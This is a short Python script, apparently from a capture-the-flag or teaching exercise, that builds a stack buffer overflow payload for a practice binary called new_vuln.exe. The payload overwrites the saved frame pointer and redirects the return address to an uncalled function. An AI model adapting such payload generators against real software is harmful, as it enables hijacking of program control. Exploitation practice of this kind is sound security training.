#!/usr/bin/python

import os
import struct

##This payload is for new_vuln.exe
payload = "A"*0x6b
payload += "BBBB"#old sp
#return to not_called function
payload+=struct.pack("I",0x000107c8)
print ("\"%s\""%payload)
